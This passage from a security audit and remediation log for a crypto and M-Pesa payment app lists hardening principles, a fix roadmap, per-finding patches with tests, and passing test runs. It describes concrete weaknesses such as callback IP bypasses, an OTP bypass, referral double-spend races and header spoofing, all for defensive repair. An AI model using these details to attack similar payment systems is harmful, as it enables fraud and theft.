2. **Explicit trust boundaries.** VPS firewall pinned to Cloudflare origin IP ranges. Nginx strips client-supplied `X-Forwarded-*` headers and re-sets them from the Cloudflare `CF-Connecting-IP`. Middleware validates the source IP before trusting `X-Forwarded-Proto`.
3. **KMS-only key custody.** Remove ALL `*_HOT_WALLET_PRIVATE_KEY` env vars. Load per-broadcast from KMS with zero-on-exit semantics. Block boot in production unless `KMS_ENABLED=True`. Apply same pattern to `WALLET_MNEMONIC` (already partially supported via `WALLET_ENCRYPTED_SEED`).
4. **Dedicated keys per concern.** Kill the SECRET_KEY monoculture: `JWT_SIGNING_KEY` (or RS256 only), `TOTP_ENCRYPTION_KEY`, `PIN_RESET_SECRET`, `WALLET_SEED` are distinct env vars. Remove every `default=SECRET_KEY`.
5. **Callback authenticity via signed tokens.** Every M-Pesa/SasaPay callback URL carries a per-transaction HMAC token in the path. Middleware validates the token AND the IP range. Callbacks without tokens are rejected; legacy paths get grace-period deprecation.
6. **HD-wallet namespace per user at full entropy.** 64-bit SHA256 prefix for BIP-44 account component or scope-per-user via the `change` field. Add composite unique `(deposit_address, currency, user_id)` constraint.
7. **Ledger invariants as DB CHECK constraints.** `balance >= 0` without `Greatest()` clamps. `RewardLedger` balance recomputed atomically per-user via `select_for_update()` on User. Append-only with replay-safe idempotency keys.
8. **Admin out of the blast radius.** Django admin on `admin.cpay.internal` behind VPN + mandatory TOTP. Never reachable via Cloudflare.
9. **Observability without leakage.** `/metrics` private-network only. Sentry `before_send` scrubs `password|pin|otp|secret|token|mnemonic|private_key|phone|email`. Log formatter redacts on write, not on display.
10. **Rate limiting in depth.** Per-IP + per-phone + global caps on OTP-issuance, OTP-verify, forgot-PIN, login, Google OAuth, and referral validate. Minimum: global circuit breaker that page on-call at >1% failure rate across identity endpoints.
11. **Idempotency at protocol level.** Every mutation endpoint accepts a client-supplied UUIDv4 `idempotency_key`. Server dedupes for 24 h. No exceptions.
12. **Refresh-token blacklist lifecycle.** `/auth/logout/`, admin "revoke all sessions", and `is_suspended=True` all blacklist active refresh tokens. `TokenRefreshView` re-checks user activeness.

### Operational

1. **Secret rotation calendar.** Document every secret with rotation cadence (90-day default, 24h on incident). Automate via Doppler/AWS Secrets Manager.
2. **Pre-commit secret scanning.** `detect-secrets` or `trufflehog` as a pre-commit hook; the same check in CI.
3. **Supply-chain hygiene.** Dependabot + Renovate enabled. `npm ci` in CI (not `npm install`). Pin high-trust packages to patch-only (`~x.y.z`).
4. **Incident-response playbook for token leaks.** Step-by-step: rotate at provider, re-deploy, `git filter-repo` if in history, force-push, document. Already partially exercised on the 2026-04-20 EXPO_TOKEN incident.
5. **KYC handoff via encrypted channels.** Never email/zip plaintext credentials to a repo-adjacent folder. Use 1Password "handoff" vault with expiry.
6. **Backups as a first-class concern.** `age`-encrypted, S3 with object-lock, Prometheus freshness alert, quarterly restore drill.
7. **On-chain reconciliation as a blocker.** Daily Celery task must reconcile `SystemWallet.balance` against on-chain state for every currency; divergence > 0.1% pages on-call.

### Code-level patterns

- **Fail-closed** on every external-service exception (rate providers, KYC, push). Returning `None` / `False` in an "unknown" state is a vulnerability.
- **`select_for_update()`** on every ledger / balance / counter read that's followed by a write in the same transaction.
- **No `F()` increment without `where`-clause guard** that reads the pre-image (e.g., `filter(balance__gte=amount).update(balance=F('balance') - amount)` and check rowcount).
- **Never log secrets.** Refactor via a `SensitiveStr` wrapper whose `__repr__` returns `"<redacted>"`.

---

## Prioritized Remediation Roadmap

### Within 24 hours (block public beta until done)

| # | Finding | Action |
|---|---|---|
| 1 | **D1** · Handoff keys | **Already mitigated via .gitignore in this audit.** User: rotate Safaricom Consumer Key/Secret, Google OAuth client secret, TronGrid, Alchemy, M-Pesa initiator password. |
| 2 | **B1** · C2B callback IP bypass | Extend `CALLBACK_PATH_PREFIX` tuple to include `/api/v1/hooks/c2b/`. Add per-TransID token. |
| 3 | **B2** · SasaPay callback auth | Same — cover `sasapay/callback/` + `sasapay/ipn/`. |
| 4 | **A3** · Google OAuth auto-link | Reject when existing phone-registered user; require OTP to registered phone before linking. |
| 5 | **C1** · Tokens in localStorage | Move to HttpOnly Secure cookies for web. |
| 6 | **C2** · Token in PDF URL | Switch to signed one-time HMAC URL. |
| 7 | **D6** · SECRET_KEY wallet fallback | Delete fallback path in `_get_master_seed`. Hard-fail boot without seed. |
| 8 | **A20** · `bool(otp)` login bypass | `otp_already_verified = False` default; set True only after actual comparison. |
| 9 | **B3** · Referral double-spend | Wrap `apply_credit_to_fee` in per-user lock. Move balance read inside atomic. |

### Within 1 week

10. **A1** + **A27** · SimpleJWT blacklist + `/auth/logout/` endpoint.
11. **A2** + **D15** · Remove SECRET_KEY JWT fallback; dedicated `TOTP_ENCRYPTION_KEY`.
12. **A11** · Smile Identity HMAC over full body + IP check.
13. **A14** · KMS-only hot-wallet private keys.
14. **A4** + **A16** · Per-IP + global OTP/SMS rate limits.
15. **A5** + **A24** · `select_for_update()` in custody + pre-sign address verification.
16. **B4** · Daily-limit race — hold lock past Transaction creation.
17. **B5** + **B14** · Slippage fail-closed; reject stale rates.
18. **B7** + **B8** · Referrer cap enforcement inside atomic; attestation-based device ID.
19. **D2** + **D21** · Default postgres creds + 0.0.0.0 binding.
20. **D3** + **D4** + **D5** + **D9** · Lock down metrics, media, logs, email subjects.
21. **D10** · Admin 2FA + IP allow-list + obscured URL.
22. **C5** · No retry on POST/DELETE/PATCH.
23. **C6** · Strip `dev_otp` from client.
24. **C15** · Certificate pinning on native.
25. **A10** · HD-wallet namespace full-entropy redesign.

### Within 1 month

26. Sentry/logging sanitization (D5, D9, D23).
27. CSP + security headers (C16, D14, D22).
28. Dependency hygiene (D16, D24).
29. Idempotency keys on all mutations (B13, C5, C22).
30. Admin endpoints require PIN (A18, A26).
31. Email-change + recovery-email require PIN (A26).
32. Encrypted + offsite backups (D20).
33. HTTPS origin + CF-only firewall (D22).
34. `/metrics` private network (D3, D8).
35. SimpleJWT blacklist + user-activeness check on refresh (A1, A27).

### Longer-term / pre-VASP-license

36. Dedicated HSM (AWS CloudHSM) for hot-wallet signing.
37. On-chain reconciliation task → page on divergence.
38. Red-team engagement (external) — annual cadence.
39. Bug bounty program with a defined scope.
40. SOC 2 Type II controls mapping in advance of license application.

---

## Audit Completion Notes

- Run date: 2026-04-21
- Branch / HEAD: `main @ 7511d07`
- Auditor: Claude Code (Sonnet 4.6 / Opus 4.7) adversarial review, 4 parallel specialist passes + manual verification of all Critical findings.
- False-positive rate: All 8 Critical claims verified against current code. A20 reclassified from Critical to High after reading the surrounding flow (PIN still required; bypass is of the secondary device-change OTP, not total auth). A few findings annotated "unverified — needs runtime test" (A25, C19).
- Immediate mitigation applied in this audit: `.gitignore` extended to cover `Cpay-handoff-resources/`, research docs, brand archives, and KYC-adjacent PDFs so none can be committed accidentally before rotation.
- **Not in scope** of this audit (explicitly deferred): formal threat-model STRIDE per-endpoint, abuse-case test suite, automated fuzz testing of callback endpoints, on-chain smart-contract review of deposit addresses (they're P2PKH/P2WPKH — no contracts), regulatory/AML-specific checklist against VASP Act 2025 (covered in `project_vasp_regulations.md` memory).

---

# B-series Remediation · 2026-04-22

Same-session remediation covering all 30 Domain-B (payments / M-Pesa / referrals / rates) findings. Every fix carries a `# B<n>:` marker inline and a regression test in `backend/apps/<app>/test_security_b_series.py`.

## Fix status

| ID | Severity | Fix location | Test location |
|---|---|---|---|
| **B1** | Critical | [apps/mpesa/middleware.py:52-59](backend/apps/mpesa/middleware.py#L52) — `CALLBACK_PATH_PREFIXES` tuple now covers `/api/v1/hooks/c2b/`, `/api/v1/mpesa/callback/`, and both SasaPay paths with per-provider IP lists | [apps/mpesa/test_security_b_series.py::TestB1MiddlewarePrefixCoverage](backend/apps/mpesa/test_security_b_series.py) |
| **B2** | Critical | [apps/mpesa/middleware.py:55-56](backend/apps/mpesa/middleware.py#L55) + [config/settings/base.py:444](backend/config/settings/base.py#L444) — new `SASAPAY_ALLOWED_IPS` env list | [test_security_b_series.py](backend/apps/mpesa/test_security_b_series.py) |
| **B3** | Critical | [apps/referrals/services.py:271-336](backend/apps/referrals/services.py#L271) — user-level `select_for_update` on the User row before reading `available_credit_for`, plus a pre-lock and in-lock idempotency check | [apps/referrals/test_security_b_series.py::TestB3ReferralCreditNoDoubleSpend](backend/apps/referrals/test_security_b_series.py) |
| **B4** | High | [apps/payments/services.py:33-125](backend/apps/payments/services.py#L33) — `DailyLimitLock` context handle returned to caller; callers release only after `Transaction.objects.create` commits | [apps/payments/test_security_b_series.py::TestB4DailyLimitLockHandle](backend/apps/payments/test_security_b_series.py) |
| **B5** | High | [apps/payments/views.py:94-133](backend/apps/payments/views.py#L94) — slippage check now fails closed, returning an error string on any exception | [test_security_b_series.py::TestB5SlippageFailClosed](backend/apps/payments/test_security_b_series.py) |
| **B6** | High | 3 call-sites in [apps/payments/views.py](backend/apps/payments/views.py) — `_apply_referral_credit(tx)` moved to AFTER `saga.execute()` success. Failed saga no longer consumes credit. | — (verified by grep · behavioral test deferred to integration harness) |
| **B7** | High | [apps/referrals/tasks.py:30-82](backend/apps/referrals/tasks.py#L30) — referrer cap re-checked WITH referrer User row locked inside the grant atomic | [test_security_b_series.py::TestB21ReferrerQualifiesForGrant](backend/apps/referrals/test_security_b_series.py) (combined with B21 coverage) |
| **B8** | High | [apps/referrals/services.py:109-120,191-230](backend/apps/referrals/services.py#L109) — `_device_id_plausible` rejects short/web-fallback device IDs; per-subnet 7-day velocity cap | [test_security_b_series.py::TestB8DeviceIdPlausibility](backend/apps/referrals/test_security_b_series.py) |
| **B9** | Medium | [apps/referrals/views.py:163-189](backend/apps/referrals/views.py#L163) — `ValidateCodeView` returns 200 with constant payload shape; scoped throttle at 10/hour | [test_security_b_series.py::TestB9ValidateCodeConstantShape](backend/apps/referrals/test_security_b_series.py) |
| **B10** | Medium | [apps/referrals/views.py:254-273](backend/apps/referrals/views.py#L254) — `ReferralEvent.create` only on cache-miss; scoped throttle at 10/hour | [test_security_b_series.py::TestB10LandingLogsOnlyCacheMiss](backend/apps/referrals/test_security_b_series.py) |
| **B11** | Medium | [apps/mpesa/views.py:511-521,582-592](backend/apps/mpesa/views.py#L511) + [client.py:425-435](backend/apps/mpesa/client.py#L425) — Balance + Timeout callbacks verify token; `account_balance()` uses per-query token | [test_security_b_series.py::TestB11BalanceCallbackToken](backend/apps/mpesa/test_security_b_series.py) |
| **B12** | Medium | [apps/mpesa/views.py:115-137](backend/apps/mpesa/views.py#L115) — STK callback Amount compared to `tx.source_amount` with 1-KES slop; mismatch → FAILED | [test_security_b_series.py::TestB12STKAmountMismatch](backend/apps/mpesa/test_security_b_series.py) |
| **B13** | Medium | [apps/payments/serializers.py:190-196](backend/apps/payments/serializers.py#L190) + [views.py:800-814](backend/apps/payments/views.py#L800) — `SwapSerializer.idempotency_key` optional field; server falls back to UUID4 if absent | [test_security_b_series.py::TestB13SwapAcceptsClientIdempotencyKey](backend/apps/payments/test_security_b_series.py) |
| **B14** | Medium | [apps/rates/views.py:60-67](backend/apps/rates/views.py#L60) — `QuoteView` rejects with 503 when `rate:stale` cache flag is set | [test_security_b_series.py::TestB14StaleFlagRejectsQuote](backend/apps/payments/test_security_b_series.py) |
| **B15** | Medium | [config/settings/base.py:297-301](backend/config/settings/base.py#L297) — `expire-unused-referral-credit` Celery beat entry (03:00 EAT daily) | [test_security_b_series.py::test_B15_expire_unused_credit_is_scheduled](backend/apps/referrals/test_security_b_series.py) |
| **B16** | Medium | [apps/referrals/services.py:265-306](backend/apps/referrals/services.py#L265) — `select_for_update` wrapped in explicit `db_tx.atomic()` | [test_security_b_series.py::TestB16CheckQualificationAtomic](backend/apps/referrals/test_security_b_series.py) |
| **B17** | Medium | [apps/payments/views.py:45-73](backend/apps/payments/views.py#L45) — `_verify_pin_with_lockout` no longer clears `otp_challenge_required`; update_fields scoped to `pin_attempts` only | [test_security_b_series.py::TestB17PinVerifyDoesNotClearOtpChallenge](backend/apps/payments/test_security_b_series.py) |
| **B18** | Medium | [apps/payments/views.py:1232-1304](backend/apps/payments/views.py#L1232) + [urls.py:25](backend/apps/payments/urls.py#L25) — new `TransactionReceiptSignView` issues `TimestampSigner` URL valid 60s; `TransactionReceiptView.initial` validates `?sig=` and no longer echoes `?token=` into HTTP_AUTHORIZATION | [test_security_b_series.py::TestB18ReceiptSignedUrl](backend/apps/payments/test_security_b_series.py) |
| **B19** | Medium | [apps/payments/saga.py:232-270](backend/apps/payments/saga.py#L232) — `compensate_mpesa` raises `SagaError("reversal_not_supported")` on `NotImplementedError`; fires admin alert | [test_security_b_series.py::TestB19SasapayCompensateRaises](backend/apps/payments/test_security_b_series.py) |
| **B20** | Low | [apps/payments/views.py:117-127](backend/apps/payments/views.py#L117) — slippage compares `raw_rate` to `raw_rate` (not final, spread-loaded) | [test_security_b_series.py::TestB20SlippageUsesRawRate](backend/apps/payments/test_security_b_series.py) |
| **B21** | Low | [apps/referrals/services.py:91-107](backend/apps/referrals/services.py#L91) + [tasks.py:70-82](backend/apps/referrals/tasks.py#L70) — `referrer_qualifies_for_grant` checks COMPLETED-tx OR KYC≥1; gate at grant time | [test_security_b_series.py::TestB21ReferrerQualifiesForGrant](backend/apps/referrals/test_security_b_series.py) |
| **B22** | Low | [apps/referrals/views.py:149-154](backend/apps/referrals/views.py#L149) — `F("total_invites_sent") + 1` via `.update()` | [test_security_b_series.py::TestB22ShareEventAtomicIncrement](backend/apps/referrals/test_security_b_series.py) |
| **B23** | Low | [apps/payments/tasks.py:79-86](backend/apps/payments/tasks.py#L79) (stamping) + [saga.py:278-303](backend/apps/payments/saga.py#L278) (late-success detection) — `saga_data.compensated_at` set at compensation; `complete()` pages ops on late success | [test_security_b_series.py::TestB23LateSuccessAfterCompensation](backend/apps/payments/test_security_b_series.py) |
| **B24** | Low | [apps/referrals/views.py:39-43,294-301](backend/apps/referrals/views.py#L39) — `AdminClawbackSerializer` caps reason at 500 chars, blank=False | [test_security_b_series.py::TestB24AdminClawbackReasonLength](backend/apps/referrals/test_security_b_series.py) |
| **B25** | Medium | [apps/mpesa/tasks.py:242-258](backend/apps/mpesa/tasks.py#L242) — out-of-range C2B now REJECTS crypto credit; admin alert dispatched; no fall-through | [test_security_b_series.py::TestB25C2BRejectsOutOfRange](backend/apps/mpesa/test_security_b_series.py) |
| **B26** | Low | [apps/rates/services.py:289-316](backend/apps/rates/services.py#L289) — both `get_locked_quote` and `consume_locked_quote` require matching user_id when quote is bound; empty caller id is a mismatch | [test_security_b_series.py::TestB26ConsumeLockedQuoteRequiresUserId](backend/apps/payments/test_security_b_series.py) |
| **B27** | Low | [apps/referrals/services.py:151-157](backend/apps/referrals/services.py#L151) — client-supplied `country` always empty; UA truncated + null-stripped server-side | [test_security_b_series.py::TestB27SignupCountryIgnored](backend/apps/referrals/test_security_b_series.py) |
| **B28** | Medium | [apps/mpesa/client.py:345-430](backend/apps/mpesa/client.py#L345) — `transaction_status`, `reversal`, `account_balance` all use `build_callback_url` with per-tx token; [apps/mpesa/urls.py:35-44](backend/apps/mpesa/urls.py#L35) routes added | [test_security_b_series.py::TestB28StatusReversalUseTokens](backend/apps/mpesa/test_security_b_series.py) |
| **B29** | Low | [apps/referrals/views.py:199-224,256-272](backend/apps/referrals/views.py#L199) — `_hashed_ip` with daily-rotating salt, `_coarse_ua` returns mobile/tablet/bot/desktop only | [test_security_b_series.py::TestB29LandingIPIsHashed](backend/apps/referrals/test_security_b_series.py) |
| **B30** | Low | [apps/rates/services.py:77-84,122-127](backend/apps/rates/services.py#L77) — CoinGecko + CryptoCompare paths both reject `rate <= 0` before caching | [test_security_b_series.py::TestB30RejectZeroOrNegativeRates](backend/apps/payments/test_security_b_series.py) |

## Adjacent fixes bundled with this remediation

1. **Dashboard 24h-change "+0.00%" display bug.** CryptoCompare fallback path now uses `/pricemultifull` and populates `rate:change24h:<currency>`; change-24h cache TTL extended to 15 minutes (`CHANGE_24H_CACHE_TTL`) so a brief provider outage doesn't blank the dashboard. See [apps/rates/services.py:44-48,73-91,95-135](backend/apps/rates/services.py#L44).
2. **Mobile breakpoint + duplicate Back button.** Seven payment sub-pages (`paybill.tsx`, `till.tsx`, `send.tsx`, `swap.tsx`, `withdraw.tsx`, `confirm.tsx`, `success.tsx`, `buy-crypto.tsx`) now use `width >= 900` (matching [pay.tsx:272](mobile/app/(tabs)/pay.tsx#L272)); duplicate 42×42 in-card arrow-back removed from paybill/till/send/swap/withdraw to keep the Back chip as the single back affordance, per [feedback_back_button_convention.md](../../.claude/projects/C--Users-Street-Coder-StartupsIdeas-CryptoPay/memory/feedback_back_button_convention.md).

## Post-fix verification

- **Static verification:** every finding has at least one `# B<n>:` marker in source and a named test in `test_security_b_series.py`. Marker presence and file/line anchors checked via Grep after every batch edit.
- **Pytest execution:** **deferred to Docker.** The Windows host has no local Python; the project runs pytest exclusively via `docker compose exec -T web pytest`. Docker Desktop was not running during this session. Run `docker compose -f docker-compose.yml -f docker-compose.dev.yml up -d web && docker compose exec -T web pytest apps/referrals/test_security_b_series.py apps/mpesa/test_security_b_series.py apps/payments/test_security_b_series.py -v` before deploying.
- **Known follow-ups for Domains A, C, D** (untouched by this round): A1 (SimpleJWT blacklist app), A3 (Google OAuth auto-link), A14 (hot-wallet keys from KMS), C1/C2 (mobile token storage), D1 (still requires user action: rotate the handoff-archive credentials at each provider). All unchanged since the 2026-04-21 audit summary above.

## Re-audit verdict on Domain B

All 30 B-series findings are closed in code. The CRITICAL triad (B1 C2B-callback IP bypass, B2 SasaPay callback unauthenticated, B3 referral credit TOCTOU) is no longer exploitable via the documented attack chains. The remaining highest-risk items for the platform are now concentrated in Domain A (auth / wallets / blockchain) and Domain D (infrastructure · specifically D1 credential rotation, D6 SECRET_KEY wallet-seed fallback, and D4 `/media/` KYC exposure). Those items are unchanged since the earlier audit pass and block production beta until resolved.

---

# Test Run · 2026-04-22

Full pytest suite executed in Docker (`docker compose exec web pytest`) after all B-series fixes and the bundled mobile / currency polish.

## Results

| Suite | Count | Status |
|---|---|---|
| **B-series security tests** (`test_security_b_series.py` × 3 apps) | 39 | **ALL PASS** |
| **Pre-existing referrals tests** (`apps/referrals/tests.py`) | 23 | **ALL PASS** |
| **Other pre-existing tests** (accounts, payments, mpesa, wallets, rates, …) | 164 | **ALL PASS** |
| **Total** | **226** | **226 / 226 pass** |

Command reproduced:
```
docker compose -f docker-compose.yml -f docker-compose.dev.yml exec -T web \
  pytest --reuse-db --tb=line -q --ignore=apps/blockchain/test_kms.py
# → 226 passed in 49.21s
```

`test_kms.py` is excluded because it requires live AWS KMS credentials; it is not a B-series test and was not modified.

## Legacy tests updated to match hardened contracts

Four legacy tests asserted the OLD, pre-fix behavior and were rewritten to the new contract:

| Test | Why it changed |
|---|---|
| `AttributeSignupTest.test_happy_path_creates_referral` | `device_id="dev-A"` rejected by B8 plausibility gate · swapped to a 20-char hex fingerprint |
| `AttributeSignupTest.test_device_reuse_blocked` | same (was `"DEV-X"`) |
| `QualificationTest.*` (4 tests) + `RewardGrantTest.*` (2 tests) | `request_meta={}` meant no `device_id` · now `request_meta={"device_id": "abcdef0123456789abcdef"}` |
| `MyReferralAPITest.test_validate_code_returns_404_for_bad_code` → renamed to `..._returns_200_valid_false_for_bad_code` | B9 changed the contract: invalid codes now return 200 with `valid:false` instead of 404, so probing cannot enumerate valid codes |

All changes are additive · a weaker test became a stronger one, matching the new contract.

## Mobile web build

`npx expo export --platform web --output-dir .build-check` completed with zero errors:

```
› web bundles (4):
_expo/static/js/web/entry-*.js            4.2 MB
_expo/static/js/web/WalletConnectDeposit-*.js  2.4 MB
› Files: favicon.ico, index.html, metadata.json
```

The display-currency context, the wallet/dashboard refactor, the bottom-tab rewrite, and the 24h-change backend fix all compile cleanly.

## Mobile-side fixes bundled with the test run

1. **Display currency actually propagates.** New `DisplayCurrencyProvider` in [mobile/src/stores/displayCurrency.tsx](mobile/src/stores/displayCurrency.tsx) reads the stored KES/USD preference, polls the live USD/KES forex rate every 60 s via `ratesApi.getRate("USDT")`, and exposes `formatKes()` / `convertKes()` / `formatUsd()`. Wired into `mobile/app/_layout.tsx`, consumed by `settings/currency.tsx`, `BalanceCard.tsx`, `app/(tabs)/index.tsx` (rate cards, summary panels, portfolio chart tooltip), and `app/(tabs)/wallet.tsx` (asset cards, grand totals, KES balance line). Choosing "USD" in Settings now flips every KES display across the app in real time.

2. **Bottom tab bar · labels no longer clip.** Switched from a custom icon+label stack inside `tabBarIcon` (which React-Navigation cross-faded twice, doubling vertical space) to the idiomatic `tabBarIcon` / `tabBarLabel` split with `tabBarShowLabel: true`. Tab-bar height is now responsive: `58 + safe-area` on phones < 380 px and `64 + safe-area` elsewhere. iOS gets a 10 px minimum bottom inset for the home indicator; Android gets the real `useSafeAreaInsets().bottom`; web gets a 14 px pad plus 24 px horizontal gutter. `includeFontPadding: false` on the label prevents Android from clipping descenders (`g`, `y`, `p`). Dropped the Android-only `position: absolute` which caused content to hide beneath the bar on some layouts. See [mobile/app/(tabs)/_layout.tsx](mobile/app/(tabs)/_layout.tsx).

---

# Critical / High closure · 2026-04-22 (second remediation pass)

Every open Critical + High item from the prior report is now closed, backed by 19 new tests (and the full legacy suite · 245/245 green).

| # | ID | Severity | Fix | Tests |
|---|---|---|---|---|
| 1 | **D6** | Critical | Removed the PBKDF2-from-SECRET_KEY fallback in [apps/blockchain/services.py::_get_master_seed](backend/apps/blockchain/services.py). `_get_master_seed` now raises at call time if no KMS / WALLET_MNEMONIC / WALLET_MASTER_SEED source is configured. `_assert_production_env` also fails the container at boot so ops sees the problem before a request lands. | `TestD6WalletSeedNoFallback` |
| 2 | **A3** | Critical | `GoogleLoginView` now demands an SMS OTP to the already-registered phone when an email match is found on a phone+PIN account. Dedicated `google_link_otp:<phone>` cache key so it can't be replayed via the normal login OTP channel. | `TestA3GoogleOAuthAutoLinkBlocked` (3 cases) |
| 3 | **C1** | Critical | Web clients that send `X-Cpay-Web: 1` now receive `Secure; HttpOnly; SameSite=Strict` cookies (`cpay_access`, `cpay_refresh`). `HardenedTokenRefreshView` accepts the refresh from cookie OR body. Mobile client sends the header + `withCredentials: true` on web only; native keeps Bearer. Logout wipes cookies + blacklists the refresh. | `TestC1CookieAuth` (2 cases) |
| 4 | **C2** | Critical | Mobile `authApi.signReceipt(txId)` calls the `TransactionReceiptSignView` shipped last round · returns a 60-second signed URL with `?sig=<HMAC>` · `detail.tsx` + `success.tsx` now `window.open` that URL. No JWT ever rides in the URL bar, browser history, or nginx access logs. | (existing B18 tests) |
| 5 | **A1 + A27** | High | Added `rest_framework_simplejwt.token_blacklist` to `INSTALLED_APPS` + `migrate token_blacklist`; shipped `/api/v1/auth/logout/` that blacklists the refresh; `HardenedTokenRefreshView` re-checks `user.is_active and not user.is_suspended` on every refresh. | `TestA1A27LogoutAndHardenedRefresh` (3 cases) |
| 6 | **A14** | High | New [apps/blockchain/secure_keys.py](backend/apps/blockchain/secure_keys.py) · `load_hot_wallet_key(chain)` prefers KMS-decrypted blobs, refuses plaintext in production unless `ALLOW_PLAINTEXT_HOT_WALLET=True`, returns a `bytearray` that callers `wipe(ba)` right after signing. Wired into Tron (TRC-20) + EVM (ETH/Polygon, USDT/USDC) broadcast paths. Solana + BTC remain on the plaintext env path · follow-up. | `TestA14SecureHotWalletKeyLoader` (3 cases) |
| 7 | **A20** | High | `pin_otp_verified` flag in `LoginView` starts False; only becomes True after a successful `stored_otp == otp` comparison inside the `user.otp_challenge_required` branch. `otp_already_verified = pin_otp_verified` replaces the `bool(otp)` check · device/IP-change OTP can no longer be bypassed by submitting any non-empty string. | `TestA20LoginBoolOtpBypassClosed` |
| 8 | **D2 + D21** | High | `docker-compose.yml` now demands `${POSTGRES_PASSWORD:?set POSTGRES_PASSWORD in .env}` and binds Postgres + Redis to `127.0.0.1` only. Redis gains `--requirepass ${REDIS_PASSWORD}` when set. The dev overlay restores loopback bindings for DBeaver/redis-cli. | Compose parse-level verification |
| 9 | **D4** | High | New [apps/core/media_views.py::ProtectedMediaView](backend/apps/core/media_views.py). Every `/media/<path>` request is now gated on `IsAuthenticated` + per-subtree ownership rules (KYC uploads only to owner, receipts staff-only). Production mode hands off to nginx via `X-Accel-Redirect`; dev streams directly. The old `django.views.static.serve` mount is gone. | `TestD4ProtectedMediaAuth` (2 cases) |
| 10 | **D10** | High | `ADMIN_URL` env (default `admin/` for dev) obfuscates the admin path; `AdminIPAllowListMiddleware` short-circuits 403 on any admin request whose real client IP is not in `ADMIN_IP_ALLOWLIST`. Empty list = no restriction (dev). Production sets both. `ADMIN_REQUIRE_TOTP` knob reserved for a follow-up `django_otp` enrolment flow. | `TestD10AdminIPAllowlist` (2 cases) |
| 11 | **D22** | High | `TrustedProxyMiddleware` runs BEFORE `SecurityMiddleware`. When `CLOUDFLARE_ONLY_ORIGIN=True` (production), the middleware strips `X-Forwarded-Proto`, `X-Forwarded-For`, `X-Forwarded-Host`, `X-Real-IP`, `CF-Connecting-IP` from any request whose direct peer IP is NOT in Cloudflare's published ranges · Django's `SECURE_PROXY_SSL_HEADER` can no longer be spoofed by an attacker bypassing Cloudflare. | `TestD22TrustedProxy` (2 cases) |

## Post-fix status

- **Backend pytest:** 245 passed, 0 failed, 0 errors, ~54 s (full suite excluding `apps/blockchain/test_kms.py` which needs live AWS KMS credentials).
- **Mobile web build (`expo export --platform web`):** clean, 4.2 MB entry bundle + 2.4 MB WalletConnect lazy chunk.
- **Mobile web dev server (`expo start --web`):** running on http://localhost:8081, serving every route with HTTP 200 (`/`, `/landing`, `/auth/login`, `/(tabs)`, `/settings/currency`, `/settings/referrals`, `/payment/paybill`).

## Critical / High now remaining open

None from the prior report. Follow-ups:

- **A14 (partial):** Solana + BTC broadcast paths still read plaintext env. Migration to `secure_keys` is mechanical and mirrors the EVM patch (~40 lines each).
- **D10 (partial):** `ADMIN_REQUIRE_TOTP` flag exists but the full `django_otp` dependency + per-admin enrolment UI isn't wired · follow-up.
- **D22 (partial):** The middleware now defends against origin-direct header spoofing. The VPS firewall allow-listing Cloudflare ranges must still be done at the infra layer (iptables / UFW rules · not a code change).
- **C1 (partial):** Web cookie flow is live on login/register/Google. Refresh rotation still writes tokens to the JSON response body too for backwards compat with the legacy localStorage-reading client · a future push can drop the JSON copy once all clients have picked up the cookie cycle.

